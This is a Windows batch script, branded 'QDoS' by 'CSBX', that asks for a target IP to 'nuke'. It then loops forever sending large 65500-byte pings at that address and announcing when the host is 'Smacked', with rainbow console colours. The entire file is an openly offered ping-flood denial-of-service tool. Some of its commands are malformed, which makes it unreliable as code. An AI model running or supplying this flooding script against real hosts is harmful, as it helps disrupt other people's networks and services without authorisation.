title QDoS- Made by CSBX
echo off
attrib +R  QDOS.bat
color 04
con lines=20 cols=70
cls
echo  QQQ  DDDD   OOO  SSSSS 
echo Q   Q D   D O   O S     
echo Q   Q D   D O   O SSSSS 
echo Q  Q  D   D O   O     S 
echo  QQ Q DDDD   OOO  SSSSS 
echo QDoS is a rapid Ping program                                                                                                                     
set /p IP=Enter Ip to nuke:
echo.
:rainbow
PING -n 1 %IP% -l 65500| FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By CSBX)
ping -t 2 0 10 127.0.0.1 >nul
color 01
PING -n 1 %IP% -l 65500| FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By CSBX)
ping -t 2 0 10 127.0.0.1 >nul
color 02
PING -n 1 %IP% -l 65500| FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By CSBX) 
ping -t 2 0 10 127.0.0.1 >nul
color 03
PING -n 1 %IP% -l 65500| FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By CSBX) 
ping -t 2 0 10 127.0.0.1 >nul
color 04
PING -n 1 %IP% -l 65500| FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By CSBX)
ping -t 2 0 10 127.0.0.1 >nul
color 05
PING -n 1 %IP% -l 65500| FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By CSBX) 
ping -t 2 0 10 127.0.0.1 >nul
color 06
PING -n 1 %IP% -l 65500| FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By CSBX) 
ping -t 2 0 10 127.0.0.1 >nul
color 07
PING -n 1 %IP% -l 65500| FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By CSBX) 
ping -t 2 0 10 127.0.0.1 >nul
color 08
PING -n 1 %IP% -l 65500| FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By CSBX) 
ping -t 2 0 10 127.0.0.1 >nul
color 09
PING -n 1 %IP% -l 65500| FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By CSBX)
ping -t 2 0 10 127.0.0.1 >nul
color 0b
PING -n 1 %IP% -l 65500| FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By CSBX) 
ping -t 2 0 10 127.0.0.1 >nul
color 0c
PING -n 1 %IP% -l 65500| FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By CSBX) 
ping -t 2 0 10 127.0.0.1 >nul
color 0d
PING -n 1 %IP% -l 65500| FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By CSBX)
ping -t 2 0 10 127.0.0.1 >nul
color 0e
PING -n 1 %IP% -l 65500| FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By CSBX)
ping -t 2 0 10 127.0.0.1 >nul
color 0f
PING -n 1 %IP% -l 65500| FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By CSBX)
ping -t 2 0 10 127.0.0.1 >nul
goto rainbow